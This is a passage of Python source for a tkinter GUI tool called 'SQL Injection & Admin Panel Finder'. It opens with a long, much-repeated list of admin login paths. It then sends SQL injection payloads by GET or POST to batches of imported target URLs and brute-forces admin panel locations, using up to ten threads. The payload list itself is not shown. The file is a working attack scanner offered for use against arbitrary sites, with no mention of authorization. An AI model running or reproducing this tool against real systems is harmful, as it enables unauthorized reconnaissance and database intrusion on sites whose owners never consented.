    "/admin_area/index.php", "/admin_dashboard/index.php", "/admin_area/index.html", "/admin_console/index.html",
    "/admin_area/admin/index.php", "/admin_login/index.php", "/admin_panel/index.html", "/admin_control/index.php",
    "/admin_dashboard/index.html", "/admin_area/admin_login.php", "/admin_console/index.php", "/admin_area/index.html",
    "/admin_login/index.html", "/admin_dashboard/index.php", "/admin_panel/index.html", "/admin_area/index.php",
    "/admin_area/admin/index.html", "/admin_area/admin_login.php", "/admin_control/index.html", "/admin_dashboard/index.php",
    "/admin_console/index.html", "/admin_area/index.php", "/admin_login/index.php", "/admin_area/admin/index.html",
    "/admin_dashboard/index.php", "/admin_console/index.php", "/admin_area/index.html", "/admin_panel/index.php",
    "/admin_area/admin_login.php", "/admin_dashboard/index.html", "/admin_control/index.html", "/admin_login/index.php",
    "/admin_area/index.html", "/admin_dashboard/index.php", "/admin_panel/index.html", "/admin_console/index.php",
    "/admin_area/admin/index.html", "/admin_area/admin_login.php", "/admin_login/index.php", "/admin_area/index.html",
    "/admin_control/index.php", "/admin_panel/index.html", "/admin_dashboard/index.html", "/admin_area/index.php",
    "/admin_console/index.html", "/admin_dashboard/index.php", "/admin_area/admin/index.php", "/admin_login/index.html",
    "/admin_area/admin_login.php", "/admin_panel/index.php", "/admin_area/index.html", "/admin_control/index.php",
    "/admin_dashboard/index.php", "/admin_area/admin/index.html", "/admin_area/index.php", "/admin_login/index.php",
    "/admin_console/index.php", "/admin_area/admin_login.php", "/admin_panel/index.html", "/admin_dashboard/index.html",
    "/admin_area/index.php", "/admin_area/admin/index.html", "/admin_dashboard/index.php", "/admin_login/index.html",
    "/admin_area/index.html", "/admin_panel/index.php", "/admin_area/admin_login.php", "/admin_dashboard/index.php",
    "/admin_console/index.html", "/admin_area/index.php", "/admin_area/admin/index.html", "/admin_login/index.php",
    "/admin_dashboard/index.php", "/admin_area/index.html", "/admin_panel/index.html", "/admin_area/admin_login.php",
    "/admin_console/index.php", "/admin_area/index.php", "/admin_dashboard/index.html", "/admin_area/admin/index.html",
    "/admin_login/index.php", "/admin_control/index.html", "/admin_area/index.php", "/admin_dashboard/index.php",
    "/admin_panel/index.html", "/admin_console/index.php", "/admin_area/admin_login.php", "/admin_area/index.html",
    "/admin_login/index.html", "/admin_dashboard/index.php", "/admin_area/admin/index.php", "/admin_panel/index.html",
    "/admin_area/index.php", "/admin_dashboard/index.html", "/admin_control/index.html", "/admin_area/admin_login.php",
    "/admin_console/index.php", "/admin_login/index.php", "/admin_area/index.html", "/admin_panel/index.html",
    "/admin_dashboard/index.php", "/admin_area/admin/index.html", "/admin_area/index.php", "/admin_area/admin_login.php",
    "/admin_console/index.html", "/admin_panel/index.php", "/admin_dashboard/index.php", "/admin_area/index.html",
    "/admin_login/index.php", "/admin_area/admin_login.php", "/admin_dashboard/index.html", "/admin_console/index.php",
    "/admin_area/index.php", "/admin_panel/index.html", "/admin_login/index.php", "/admin_dashboard/index.html",
    "/admin_area/admin/index.html", "/admin_console/index.php", "/admin_area/index.html", "/admin_dashboard/index.php",
    "/admin_panel/index.php", "/admin_area/index.php", "/admin_login/index.html", "/admin_area/admin_login.php",
    "/admin_control/index.html", "/admin_area/admin/index.php", "/admin_dashboard/index.html", "/admin_console/index.html",
    "/admin_area/index.php", "/admin_login/index.php", "/admin_panel/index.html", "/admin_dashboard/index.php",
    "/admin_area/admin_login.php", "/admin_area/index.html", "/admin_dashboard/index.php", "/admin_area/admin/index.html",
    "/admin_console/index.php", "/admin_panel/index.html", "/admin_area/index.php", "/admin_login/index.php",
    "/admin_control/index.html", "/admin_dashboard/index.php", "/admin_area/admin_login.php", "/admin_area/index.html",
    "/admin_area/index.php", "/admin_panel/index.php", "/admin_console/index.html", "/admin_dashboard/index.php",
    "/admin_area/admin/index.html", "/admin_login/index.html", "/admin_area/admin_login.php", "/admin_control/index.html",
    "/admin_area/index.php", "/admin_dashboard/index.html", "/admin_panel/index.php", "/admin_console/index.php",
    "/admin_area/admin/index.html", "/admin_login/index.php", "/admin_area/index.html", "/admin_area/admin_login.php",
    "/admin_dashboard/index.php", "/admin_console/index.html", "/admin_panel/index.html", "/admin_login/index.php",
    "/admin_area/index.html", "/admin_area/index.php", "/admin_control/index.html", "/admin_dashboard/index.php",
    "/admin_console/index.php", "/admin_panel/index.html", "/admin_area/admin/index.html"
]


# Queues for threading
url_queue = Queue()
admin_queue = Queue()
output_queue = Queue()
stop_event = threading.Event()

def test_sql_injection(url, method, output_queue):
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept-Language": "en-US,en;q=0.5"
    }
    found_vulnerable = False
    results = []

    # Normalize URL
    url = urlparse(url)._replace(path=urlparse(url).path.rstrip('/'), query='', fragment='').geturl()

    for payload in sql_payloads:
        try:
            start_time = time.time()
            if method.upper() == "GET":
                injection_url = f"{url}?input={payload}"
                response = requests.get(injection_url, headers=headers, timeout=10)
            else:
                response = requests.post(url, data={"input": payload}, headers=headers, timeout=10)

            elapsed_time = time.time() - start_time
            response_text = response.text.lower()

            if any(keyword in response_text for keyword in ["information_schema", "database", "schema"]):
                found_vulnerable = True
                results.append(f"[Vulnerable] URL: {url} | Payload: {payload}\nResponse Time: {elapsed_time:.2f} seconds\n")
                break
            elif any(error in response_text for error in ["syntax error", "mysql", "sql", "warning"]):
                results.append(f"[!] Possible vulnerability detected on {url} with payload: {payload}\nResponse Time: {elapsed_time:.2f} seconds\n")
            else:
                results.append(f"Payload: {payload} - No vulnerability detected on {url}.\nResponse Time: {elapsed_time:.2f} seconds\n")

        except requests.exceptions.RequestException as e:
            results.append(f"Error with payload {payload} on {url}: {str(e)}\n")
            continue

    if not found_vulnerable:
        results.append(f"No vulnerabilities detected on {url} with tested payloads.\n")

    output_queue.put(results)

def search_admin_panel(url, output_queue):
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    found_admin_panel = False
    results = []
    base_url = urlparse(url)._replace(path='', query='', fragment='').geturl()

    for path in admin_paths:
        full_url = urljoin(base_url, path)
        try:
            response = requests.get(full_url, headers=headers, timeout=10)
            if response.status_code == 200:
                results.append(f"[FOUND] Admin panel at: {full_url}\n")
                found_admin_panel = True
                break
            else:
                results.append(f"Checked: {full_url} - Not found (Status: {response.status_code})\n")
        except requests.exceptions.RequestException as e:
            results.append(f"Error accessing: {full_url}: {str(e)}\n")
            continue

    if not found_admin_panel:
        results.append(f"No admin panel found for {url}.\n")

    output_queue.put(results)

def worker_sql_injection():
    while not stop_event.is_set():
        item = url_queue.get()
        if item is None:
            break
        url, method = item
        test_sql_injection(url, method, output_queue)
        url_queue.task_done()

def worker_admin_panel():
    while not stop_event.is_set():
        item = admin_queue.get()
        if item is None:
            break
        url = item
        search_admin_panel(url, output_queue)
        admin_queue.task_done()

def run_sql_injection_tests(urls, method):
    for url in urls:
        url_queue.put((url, method))
    for _ in range(min(10, len(urls))):
        threading.Thread(target=worker_sql_injection, daemon=True).start()
    url_queue.join()
    stop_event.set()
    display_results()

def run_admin_panel_search(urls):
    for url in urls:
        admin_queue.put(url)
    for _ in range(min(10, len(urls))):
        threading.Thread(target=worker_admin_panel, daemon=True).start()
    admin_queue.join()
    stop_event.set()
    display_results()

def stop_all_operations():
    stop_event.set()
    messagebox.showinfo("Operation Stopped", "All operations have been stopped.")

def display_results():
    while not output_queue.empty():
        results = output_queue.get()
        for line in results:
            output_text.insert(tk.END, line)
        output_queue.task_done()

def import_urls():
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", ".*")])
    if file_path:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
            for url in urls:
                if urlparse(url).scheme in ['http', 'https']:
                    urls_listbox.insert(tk.END, url)
                else:
                    messagebox.showwarning("Invalid URL", f"Skipping invalid URL: {url}")
        messagebox.showinfo("Import URLs", f"Imported {len(urls)} URLs.")

def test_all_sql_injection():
    urls = urls_listbox.get(0, tk.END)
    if not urls:
        messagebox.showwarning("No URLs", "Please import URLs first.")
        return
    method = method_var.get()
    stop_event.clear()
    threading.Thread(target=run_sql_injection_tests, args=(urls, method), daemon=True).start()

def search_all_admin_panels():
    urls = urls_listbox.get(0, tk.END)
    if not urls:
        messagebox.showwarning("No URLs", "Please import URLs first.")
        return
    stop_event.clear()
    threading.Thread(target=run_admin_panel_search, args=(urls,), daemon=True).start()

def save_results():
    results = output_text.get(1.0, tk.END)
    if results.strip():
        file_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                 filetypes=[("Text files", "*.txt"), ("All files", ".*")])
        if file_path:
            with open(file_path, "w", encoding='utf-8') as file:
                file.write(results)
            messagebox.showinfo("Save Results", "Results saved successfully.")
    else:
        messagebox.showinfo("Save Results", "No results to save.")

def clear_results():
    output_text.delete(1.0, tk.END)

def copy_results():
    root.clipboard_clear()
    root.clipboard_append(output_text.get(1.0, tk.END))

def paste_to_url():
    try:
        clipboard_content = root.clipboard_get()
        url_entry.delete(0, tk.END)
        url_entry.insert(tk.END, clipboard_content)
    except tk.TclError:
        pass

def create_context_menu(widget):
    menu = Menu(widget, tearoff=0)
    menu.add_command(label="Cut", command=lambda: widget.event_generate("<<Cut>>"))
    menu.add_command(label="Copy", command=lambda: widget.event_generate("<<Copy>>"))
    menu.add_command(label="Paste", command=lambda: widget.event_generate("<<Paste>>"))
    widget.bind("<Button-3>", lambda event: menu.tk_popup(event.x_root, event.y_root))

# GUI setup
root = tk.Tk()
root.title("SQL Injection & Admin Panel Finder")
root.geometry("1000x700")

# Menu
menubar = Menu(root)
file_menu = Menu(menubar, tearoff=0)
file_menu.add_command(label="Import URLs", command=import_urls)
file_menu.add_separator()
file_menu.add_command(label="Exit", command=root.quit)
menubar.add_cascade(label="File", menu=file_menu)

edit_menu = Menu(menubar, tearoff=0)
edit_menu.add_command(label="Clear Results", command=clear_results)
edit_menu.add_command(label="Copy Results", command=copy_results)
edit_menu.add_command(label="Paste URL", command=paste_to_url)
edit_menu.add_command(label="Save Results", command=save_results)
menubar.add_cascade(label="Edit", menu=edit_menu)

root.config(menu=menubar)

# URL Entry Frame
url_frame = tk.Frame(root)
url_frame.pack(pady=10, padx=10, fill=tk.X)

url_label = tk.Label(url_frame, text="Enter Target URL:")
url_label.pack(side=tk.LEFT)

url_entry = tk.Entry(url_frame, width=60)
url_entry.pack(side=tk.LEFT, padx=5)
create_context_menu(url_entry)

add_url_button = tk.Button(url_frame, text="Add URL", command=lambda: urls_listbox.insert(tk.END, url_entry.get()))
add_url_button.pack(side=tk.LEFT, padx=5)

# URLs Listbox
urls_listbox = tk.Listbox(root, selectmode=tk.EXTENDED, width=150, height=10)
urls_listbox.pack(padx=10, pady=5)
create_context_menu(urls_listbox)

# Method Selection Frame
method_frame = tk.Frame(root)
method_frame.pack(pady=5, padx=10, anchor=tk.W)

method_label = tk.Label(method_frame, text="Select Request Method:")
method_label.pack(side=tk.LEFT)

method_var = tk.StringVar(value="GET")
get_radio = tk.Radiobutton(method_frame, text="GET", variable=method_var, value="GET")
get_radio.pack(side=tk.LEFT, padx=5)
post_radio = tk.Radiobutton(method_frame, text="POST", variable=method_var, value="POST")
post_radio.pack(side=tk.LEFT, padx=5)

# Buttons Frame
button_frame = tk.Frame(root)
button_frame.pack(pady=10)

test_button = tk.Button(button_frame, text="Run SQL Injection Test", command=test_all_sql_injection, bg="red", fg="white")
test_button.grid(row=0, column=0, padx=5, pady=5)

admin_button = tk.Button(button_frame, text="Search Admin Panels", command=search_all_admin_panels, bg="blue", fg="white")
admin_button.grid(row=0, column=1, padx=5, pady=5)

import_button = tk.Button(button_frame, text="Import URLs", command=import_urls)
import_button.grid(row=0, column=2, padx=5, pady=5)

clear_button = tk.Button(button_frame, text="Clear Results", command=clear_results)
clear_button.grid(row=0, column=3, padx=5, pady=5)

copy_button = tk.Button(button_frame, text="Copy Results", command=copy_results)
copy_button.grid(row=0, column=4, padx=5, pady=5)

paste_button = tk.Button(button_frame, text="Paste URL", command=paste_to_url)
paste_button.grid(row=0, column=5, padx=5, pady=5)

save_button = tk.Button(button_frame, text="Save Results", command=save_results)
save_button.grid(row=0, column=6, padx=5, pady=5)

stop_button = tk.Button(button_frame, text="Stop", command=stop_all_operations, bg="orange", fg="white")
stop_button.grid(row=0, column=7, padx=5, pady=5)

# Output Text Area
output_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=30, width=120)
output_text.pack(padx=10, pady=5)
create_context_menu(output_text)

# Status Bar
status_var = tk.StringVar()
status_var.set("Ready")
status_bar = tk.Label(root, textvariable=status_var, bd=1, relief=tk.SUNKEN, anchor=tk.W)
status_bar.pack(side=tk.BOTTOM, fill=tk.X)

# Update the output display periodically
def periodic_display():
    display_results()
    root.after(100, periodic_display)

root.after(100, periodic_display)
root.mainloop()
